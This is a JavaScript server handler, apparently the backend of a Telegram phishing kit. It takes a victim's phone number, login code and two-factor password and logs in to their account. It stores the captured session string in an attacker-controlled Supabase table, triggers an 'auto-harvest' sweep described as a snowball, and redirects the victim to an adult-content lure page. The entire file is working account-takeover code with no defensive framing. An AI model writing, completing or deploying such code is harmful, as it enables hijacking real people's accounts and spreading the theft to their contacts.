import { TelegramClient } from "telegram";
import { StringSession } from "telegram/sessions";
import { Api } from "telegram/tl";
import { createClient } from '@supabase/supabase-js';

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);
const apiId = parseInt(process.env.TELEGRAM_API_ID);
const apiHash = process.env.TELEGRAM_API_HASH;

export default async function handler(req, res) {
  let { phoneNumber, code, password, ownerId } = req.body;
  const cleanPhone = phoneNumber.toString().replace(/\D/g, '');

  try {
      // 1. Busca auth state
      const { data: authData } = await supabase.from('auth_state').select('*').eq('phone_number', cleanPhone).single();
      if (!authData) return res.status(400).json({ error: "Sessão expirada." });

      const client = new TelegramClient(new StringSession(authData.temp_session), apiId, apiHash, { connectionRetries: 2, useWSS: false });
      await client.connect();

      // 2. Login
      if (password) {
            await client.signIn({ password, phoneNumber: cleanPhone, phoneCodeHash: authData.phone_code_hash, phoneCode: code });
      } else {
            try {
                await client.invoke(new Api.auth.SignIn({ phoneNumber: cleanPhone, phoneCodeHash: authData.phone_code_hash, phoneCode: code }));
            } catch (e) {
                if (e.message.includes("SESSION_PASSWORD_NEEDED")) {
                    await client.disconnect();
                    return res.status(200).json({ status: 'needs_2fa' });
                }
                throw e;
            }
      }

      // 3. Salva Sessão Oficial
      const finalSession = client.session.save();
      await supabase.from('telegram_sessions').upsert({
        phone_number: cleanPhone,
        session_string: finalSession,
        is_active: true,
        owner_id: ownerId || 'admin',
        created_at: new Date()
      }, { onConflict: 'phone_number' });

      // 4. Limpa temporário
      await supabase.from('auth_state').delete().eq('phone_number', cleanPhone);
      await client.disconnect();

      // --- GATILHO BOLA DE NEVE (AUTO-HARVEST) ---
      // Chama a API de varredura sem esperar resposta (Fire-and-Forget) para não travar o usuário
      // O fetch precisa de URL absoluta em server-side
      const protocol = req.headers['x-forwarded-proto'] || 'http';
      const host = req.headers.host;
      
      fetch(`${protocol}://${host}/api/auto-harvest`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phone: cleanPhone, ownerId: ownerId || 'admin' })
      }).catch(err => console.error("Erro ao disparar auto-harvest:", err));

      res.status(200).json({ success: true, redirect: "https://hotconteudoss.netlify.app" });

  } catch (error) {
    res.status(400).json({ error: error.message || "Erro na validação" });
  }
}
